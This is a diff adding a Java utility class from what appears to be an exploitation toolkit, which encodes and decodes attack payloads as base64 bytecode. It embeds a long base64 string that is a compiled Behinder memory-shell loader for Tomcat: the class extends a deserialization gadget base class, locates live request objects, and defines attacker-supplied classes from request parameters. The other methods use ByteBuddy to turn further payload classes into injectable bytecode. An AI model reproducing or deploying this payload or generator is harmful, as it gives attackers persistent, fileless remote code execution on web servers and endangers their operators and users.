@@ -1,0 +1,97 @@
+package cn.safe6.util;
+
+
+import cn.safe6.payload.TomcatEchoAll;
+import net.bytebuddy.ByteBuddy;
+
+import java.io.*;
+import java.util.Arrays;
+import java.util.Base64;
+
+public class GetByteCodeUtil {
+
+    public static void main(String[] args) throws Exception {
+        decodeData();
+       //encodeData();
+
+        //getFileByBytes(TomcatEchoAll.getPayload(),"load.class");
+    }
+
+    public static void decodeData() throws Exception {
+
+        String data ="yv66vgAAADQA/QoAPQCLCgADAIwHAI0KACsAjgcAjwoAKwCQCgCRAJIKAJEAkwoABQCUCgCVAJYKAJUAlwgAmAoAMACZBwB9CgCVAJoIAJsKAJwAnQgAnggAnwcAoAgAoQgAoggAowoABQCkCAClBwCmCwAaAKcLABoAqAcAqQgAqgcAqwoAHwCsBwCtCgAhAK4KACEArwgAsAoAIQCxBwCyCgAmAIsKACYAswcAtAgAtQcAtgcAYgkAMgC3CgArALgKALkAkgcAugoAKwC7BwC8CgAyAL0KALkAvggAvwoAKwDABwDBBwDCCgDDAMQKAAMAxQcAxgoAOwCkBwDHAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACpMY24vc2FmZTYvcGF5bG9hZC9tZW1zaGVsbC9CZWhpbmRlckxvYWRlcjsBAAhnZXRGaWVsZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyNQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAEdmFyMAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjEBABJMamF2YS9sYW5nL1N0cmluZzsBAAR2YXIyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABHZhcjMBABFMamF2YS9sYW5nL0NsYXNzOwEADVN0YWNrTWFwVGFibGUHAMgHALYHAI8BAApFeGNlcHRpb25zAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwDJAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEABXZhcjIyAQAFdmFyMTMBAAV2YXIxNAEAAltCAQAFdmFyMTUBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABXZhcjE2AQAFdmFyMTcBAAV2YXIxOAEABXZhcjE5AQAFdmFyMjABAAV2YXIyMQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABHZhcjgBAB9Mb3JnL2FwYWNoZS9jb3lvdGUvUmVxdWVzdEluZm87AQAEdmFyOQEAG0xvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0OwEABXZhcjEwAQAnTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3Q7AQAFdmFyMTEBAChMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2U7AQAFdmFyMTIBACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABHZhcjcBABBMamF2YS91dGlsL0xpc3Q7AQAEdmFyNgEABHZhcjQBABJMamF2YS9sYW5nL1RocmVhZDsBAAFJAQABWgEAE1tMamF2YS9sYW5nL1RocmVhZDsBAAV2YXIyMwcAygcAywcAjQcApgcAqQcAqwcArQcAzAcAzQcAxgEAClNvdXJjZUZpbGUBABNCZWhpbmRlckxvYWRlci5qYXZhDAA+AD8MAM4AzwEAEGphdmEvbGFuZy9PYmplY3QMANAA0QEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgwA0gDPBwDIDADTANQMANUA1gwAPgDXBwDKDADYANkMANoA2wEAB3RocmVhZHMMAEUARgwA3ADdAQAEZXhlYwcAywwA3gDfAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAAZnbG9iYWwMAOAAPwEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwA4QDiDADVAOMBAB1vcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0SW5mbwEAA3JlcQEAGW9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3QMAOQA4wEAJW9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3QMAOUA5gwA5wDoAQACYzEMAOkA6gEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAOsA7AEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzDADtAFAMAO4A7wcA8AEAKGNuL3NhZmU2L3BheWxvYWQvbWVtc2hlbGwvQmVoaW5kZXJMb2FkZXIMAPEA8gEAEWphdmEvbGFuZy9JbnRlZ2VyDAA+APMMAPQA9QEAAmMyDAD2APcBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UHAPgMAPkA+gwA+wD8AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9UaHJlYWQBABBqYXZhL2xhbmcvU3RyaW5nAQAmb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2UBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANZ2V0U3VwZXJjbGFzcwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAD3ByaW50U3RhY2tUcmFjZQEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXROb3RlAQALZ2V0UmVzcG9uc2UBACooKUxvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAQoSSlWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAOZ2V0Q29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZh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";
+        System.out.println(data);
+        System.out.println("oldLen:"+data.length());
+        getFileByBytes(Base64.getDecoder().decode(data),"load.class");
+
+        //对比生成前后，长度差距
+        FileReader fileReader = new FileReader(new File("load.class"));
+        char[] code = new char[1024];
+        fileReader.read(code);
+        String newData = Base64.getEncoder().encodeToString(Arrays.toString(code).getBytes());
+        System.out.println(newData);
+        System.out.println("newLen:"+ newData.length());
+
+    }
+
+    public static void encodeData(){
+        byte[] code= new ByteBuddy()
+                .redefine(cn.safe6.payload.memshell.BehinderLoader2.class)
+                .name("cn.safe6.payload.memshell.BehinderLoader2")
+                .make()
+                .getBytes();
+        System.out.println(Base64.getEncoder().encodeToString(code));
+    }
+
+    public static String getEncodeData(Class className){
+        byte[] code= new ByteBuddy()
+                .redefine(className)
+                .name(className.getName())
+                .make()
+                .getBytes();
+        return Base64.getEncoder().encodeToString(code);
+    }
+
+    public static byte[] getDataBytes(Class className){
+        byte[] code= new ByteBuddy()
+                .redefine(className)
+                .name(className.getName())
+                .make()
+                .getBytes();
+        return code;
+    }
+
+
+    //将Byte数组转换成文件
+    public static void getFileByBytes(byte[] bytes, String fileName) {
+        BufferedOutputStream bos = null;
+        FileOutputStream fos = null;
+        File file = null;
+        try {
+            file = new File(fileName);
+            fos = new FileOutputStream(file);
+            bos = new BufferedOutputStream(fos);
+            bos.write(bytes);
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            if (bos != null) {
+                try {
+                    bos.close();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+            if (fos != null) {
+                try {
+                    fos.close();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+    }
+
+
+
+}
